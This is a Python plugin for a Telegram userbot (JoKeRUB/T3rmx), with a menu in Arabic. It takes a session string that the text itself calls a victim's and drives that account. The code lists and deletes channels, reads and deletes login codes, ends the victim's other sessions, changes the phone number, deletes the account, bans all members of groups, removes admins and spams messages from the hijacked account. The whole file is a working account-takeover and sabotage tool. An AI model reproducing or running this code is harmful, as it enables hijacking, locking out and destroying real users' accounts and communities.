
from JoKeRUB import bot, l313l
from ..core.session import tgbot
from ..core.auth import is_owner
from telethon import events, functions, types, Button
from datetime import timedelta
from JoKeRUB.utils import admin_cmd
import asyncio
from ..Config import Config
import os, asyncio, re
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr

# tgbot is the assistant bot client imported from core.session

Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
# Single place to set the link used by every menu button.
SUPPORT_URL = "https://t.me/t3rmx_official"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    try:
        await X(rt())
        return True
    except Exception as rr:
        return rr

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  """Read-only 2FA status check. Returns None when the check fails."""
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    try:
      password = await X(functions.account.GetPasswordRequest())
      return bool(getattr(password, "has_password", False))
    except Exception:
      return None

async def demall(strses, grp):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    i = ""
    
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await X.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
    
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "t3rmx"
menu = '''

"A" :~ [معرفه قنوات/كروبات التي يملكها]

"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]

"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]

"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]

"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 

"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]

"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]

"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]

"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]

"J" :~ [حذف الحساب]

"K" :~ [حذف جميع المشرفين في كروب/قناه]

"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]

"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]

"N" ~ [اذاعة رسالة لكل المحادثات / الكروبات / الخاص]

'''
mm = '''
قم بلأنضمام الى قناة T3rmx @t3rmx_official
'''

_hack_owner_only = lambda e: is_owner(getattr(e, "sender_id", None))

keyboard = [
  [  
    Button.inline("A", data="A"), 
    Button.inline("B", data="B"),
    Button.inline("C", data="C"),
    Button.inline("D", data="D"),
    Button.inline("E", data="E")
    ],
  [
    Button.inline("F", data="F"), 
    Button.inline("G", data="G"),
    Button.inline("H", data="H"),
    Button.inline("I", data="I"),
    Button.inline("J", data="J"),
    ],
  [
    Button.inline("K", data="K"),
    Button.inline("L", data="L"),
    Button.inline("M", data="M"),
    Button.inline("N", data="N"),
    ],
  [
    Button.url("سورس T3rmx 🤡", SUPPORT_URL)
    ]
]
async def show_menu(event):
    """Send the menu with its buttons; shared by /hack and the ?start=hack link."""
    await event.reply(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)


if Config.TG_BOT_USERNAME is not None and tgbot is not None:
    @tgbot.on(events.InlineQuery)
    async def inline_handler(event):
        builder = event.builder
        result = None
        joker = Bot_Username.replace("@", "")
        if event.text.startswith("هاك") and is_owner(event.query.user_id):
            buttons = Button.url("اضغط هنا لعرض الأوامر", f"https://t.me/{joker}?start=hack")
            result = builder.article(
                title="T3rmx 🤡",
                description="اضغط على الزر لعرض الأوامر.",
                text="᯽︙ قم بالضغط على الزر ادناه لعرض قائمة الأوامر",
                buttons=buttons,
            )
        await event.answer([result] if result else None)

    @tgbot.on(events.NewMessage(pattern=r"^/start(?:@[\w_]+)?\s+hack$", func=lambda e: e.is_private))
    async def start_hack_payload(event):
        # The inline result's button opens "?start=hack", delivered as "/start hack".
        if is_owner(event.sender_id):
            await show_menu(event)
        else:
            await event.reply("هذا البوت خاص. يمكنك نشر نسختك من مستودع T3rmx UserBot.")


@bot.on(admin_cmd(outgoing=True, pattern="هاك"))
async def repo(event):
    if event.fwd_from:
        return
    try:
        await bot.send_message(Config.TG_BOT_USERNAME, "/hack")
        await event.delete()
    except Exception:
        await event.reply(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)


@tgbot.on(events.NewMessage(pattern=r"^/hack(?:@[\w_]+)?$", func=lambda e: e.is_private))
async def hack_menu(event):
    if is_owner(event.sender_id):
        await show_menu(event)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^A$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
      if len(i) > 1:
        file = open("session.txt", "w")
        file.write(i + "\n\nDetails BY @vvsks")
        file.close()
        await tgbot.send_file(event.chat_id, "session.txt")
        try:
            os.remove("session.txt")
        except OSError:
            pass
      else:
        await event.reply(i + "\n\nشكراً لأستخدامك سورس T3rmx ❤️. \n/hack", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^B$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
    await x.send_message("الان ارسل الكود تيرمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nشكراً لأستخدامك سورس T3rmx ❤️.\n/hack", buttons=keyboard)
    
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^C$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
    await x.send_message("الان ارسل الكود تيرمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
    await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("يتم حظر جميع اعضاء القناة/الكروب", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^D$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nشكرا لأستخدامك سورس T3rmx", buttons=keyboard)
    
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^E$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
    await x.send_message("الان ارسل الكود تيرمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
    await x.send_message("اعطني معرف/ايدي القناة او الكروب")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^F$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
    await x.send_message("الان ارسل الكود تيرمكس")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
    await x.send_message("اعطيني معرف /ايدي الكروب او القناة")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("لقد تم مغادرة القناة او الكروب,", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^G$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك T3rmx.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^H$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      i = await user2fa(strses.text)
      if i is None:
        await event.reply("تعذر التحقق من حالة التحقق بخطوتين. حاول مرة اخرى.", buttons=keyboard)
      elif i:
        await event.reply("التحقق بخطوتين مفعل على هذا الحساب.", buttons=keyboard)
      else:
        await event.reply("التحقق بخطوتين غير مفعل على هذا الحساب.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^I$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      i = await terminate(strses.text)
      if i == True:
      	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك T3rmx.", buttons=keyboard)
      else:
          await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @vvsks\n{i}")

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^J$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("تم حذف الحساب بنجاح 😈.", buttons=keyboard)

      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^K$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
      grp = await x.get_response()
      await x.send_message("الان ارسل لي المعرف")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("سأرفعك في القناة/الكروب 😉.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^L$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("تم حذف جميع مشرفين الكروب/القناة.", buttons=keyboard)

@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^M$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
      await x.send_message("اعطني رقم التي تريد تغير اليه\n[ملاحظه /لا تستخدم ارقام الوهميه]\n[اذا استخدمت الارقام الوهميه مراح تكدر تحصل الكود] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("الان ارسل لي الهاش")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("الان ارسل لي الكود")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("لقد تم تغير الرقم بنجاح ✅")
        else:
          await event.respond("هنالك خطأ ما حصل")
      except Exception as e:
        await event.respond(f"قم بتوجيه الرسالة في مجموعة المساعدة الخاصة بالقسم المدفوع \n str(e)")



@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^N$"), func=_hack_owner_only))
async def start(event):
    keyboard = [
      [  
        Button.inline("a", data="a"), 
        Button.inline("b", data="b"),
        Button.inline("c", data="c"),
        ],
      [
        Button.url("القناة", "https://t.me/t3rmx_official")
        ]
    ]
    await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)



BROADCAST_SKIP_CHAT_IDS = {-1001606996743}
BROADCAST_DELAY = 0.5


async def _broadcast(strses, msg, scope):
    """Send one message per matching dialog and return how many were sent."""
    sent = 0
    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
        async for dialog in X.iter_dialogs():
            if dialog.id in BROADCAST_SKIP_CHAT_IDS:
                continue
            if scope == "groups" and not dialog.is_group:
                continue
            if scope == "private" and (
                not dialog.is_user or getattr(dialog.entity, "bot", False)
            ):
                continue
            try:
                await X.send_message(dialog.id, msg)
                sent += 1
            except Exception:
                pass
            await asyncio.sleep(BROADCAST_DELAY)
    return sent


async def gcasta(strses, msg):
    return await _broadcast(strses, msg, "all")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^a$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل لي الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("الان ارسل لي الرسالة")
      msg = await x.get_response()
      await x.send_message("الان سيتم ارسال الرسالة مرة واحدة لكل محادثة محددة")
      i = await gcasta(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} all 😉😉.", buttons=keyboard)

async def gcastb(strses, msg):
    return await _broadcast(strses, msg, "groups")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^b$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("الان ارسل لي الرسالة")
      msg = await x.get_response()
      await x.send_message("الان سيتم ارسال الرسالة مرة واحدة لكل كروب محدد")
      i = await gcastb(strses.text, msg.text)
      await event.reply(f"Done Gcasted In {i} Group 😉😉.", buttons=keyboard)

async def gcastc(strses, msg):
    return await _broadcast(strses, msg, "private")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"^c$"), func=_hack_owner_only))
async def users(event):
  async with tgbot.conversation(event.chat_id, timeout=300) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("الان ارسل لي الرساله")
      msg = await x.get_response()
      await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
      i = await gcastc(strses.text, msg.text)
      await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)